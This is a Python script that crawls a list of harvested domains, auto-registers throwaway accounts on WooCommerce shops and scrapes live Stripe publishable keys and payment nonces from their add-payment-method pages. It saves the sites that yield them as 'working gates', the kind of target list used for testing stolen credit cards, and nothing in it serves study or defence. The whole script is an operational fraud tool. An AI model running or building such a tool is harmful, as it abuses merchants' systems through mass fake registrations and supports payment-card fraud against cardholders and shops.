import asyncio
import json
import re
from curl_cffi.requests import AsyncSession

with open('data/harvested_domains.txt', 'r', encoding='utf-8') as f:
    raw_domains = [l.strip() for l in f if l.strip()]

# Filter out obvious junk
junk = ['blogspot', '1drv.ms', 'supportally', 'abc.com', 'google', 'wordpress', 'github', 'pastebin']
filtered = [d for d in raw_domains if not any(j in d for j in junk) and '.' in d]
print(f"Total clean domains to scan: {len(filtered)}")

async def check_target(domain: str, sem: asyncio.Semaphore):
    base_url = f"https://{domain}"
    reg_url = f"{base_url}/my-account/"
    async with sem:
        try:
            async with AsyncSession(impersonate="chrome131", verify=False) as s:
                # 1. GET
                r = await s.get(reg_url, timeout=7)
                if r.status_code != 200:
                    return None
                html = r.text
                
                nonce_m = re.search(r'woocommerce-register-nonce["\']?\s*value=["\']([a-f0-9]{10})["\']', html)
                if not nonce_m:
                    return None
                reg_nonce = nonce_m.group(1)
                
                has_username = 'name="username"' in html
                
                # 2. POST
                uname = f"usr_{reg_nonce[:6]}"
                email = f"alex.{reg_nonce[:6]}@gmail.com"
                pwd = f"Sec_{reg_nonce[:6]}!9aA"
                body = {
                    "email": email,
                    "password": pwd,
                    "woocommerce-register-nonce": reg_nonce,
                    "_wp_http_referer": "/my-account/",
                    "register": "Register"
                }
                if has_username:
                    body["username"] = uname
                    
                headers = {"Origin": base_url, "Referer": reg_url}
                r2 = await s.post(reg_url, data=body, headers=headers, timeout=9)
                cookies = s.cookies.get_dict()
                if not any("wordpress_logged_in" in k for k in cookies):
                    return None
                
                # 3. GET add-payment-method
                add_pm = f"{base_url}/my-account/add-payment-method/"
                r3 = await s.get(add_pm, timeout=7)
                pk_m = re.findall(r'pk_live_[0-9a-zA-Z]{24,}', r3.text)
                upe_m = re.search(r'createAndConfirmSetupIntentNonce["\']?\s*[:=]\s*["\']([^"\']+)["\']', r3.text)
                legacy_m = re.search(r'add_card_nonce["\']?\s*[:=]\s*["\']([a-f0-9]{10})["\']', r3.text)
                
                pk = pk_m[0] if pk_m else ""
                upe_nonce = upe_m.group(1) if upe_m else ""
                legacy_nonce = legacy_m.group(1) if legacy_m else ""
                
                if pk and (upe_nonce or legacy_nonce):
                    print(f"🔥 [FOUND WORKING GATE] {domain} | PK: {pk[:20]}... | UPE: {upe_nonce} | LEGACY: {legacy_nonce}", flush=True)
                    return {
                        "domain": domain,
                        "base_url": base_url,
                        "reg_url": reg_url,
                        "add_pm_url": add_pm,
                        "ajax_url": f"{base_url}/wp-admin/admin-ajax.php",
                        "pk_live": pk,
                        "gate_type": "wc_stripe_upe" if upe_nonce else "wc_stripe_legacy",
                        "upe_nonce": upe_nonce,
                        "legacy_nonce": legacy_nonce
                    }
        except Exception:
            return None
    return None

async def main():
    sem = asyncio.Semaphore(20)
    tasks = [check_target(d, sem) for d in filtered]
    results = await asyncio.gather(*tasks)
    working = [r for r in results if r]
    print(f"\n==========================================")
    print(f"Total working gates found: {len(working)}")
    print(f"==========================================")
    with open('scratch/found_gates.json', 'w', encoding='utf-8') as f:
        json.dump(working, f, indent=2)

if __name__ == "__main__":
    asyncio.run(main())
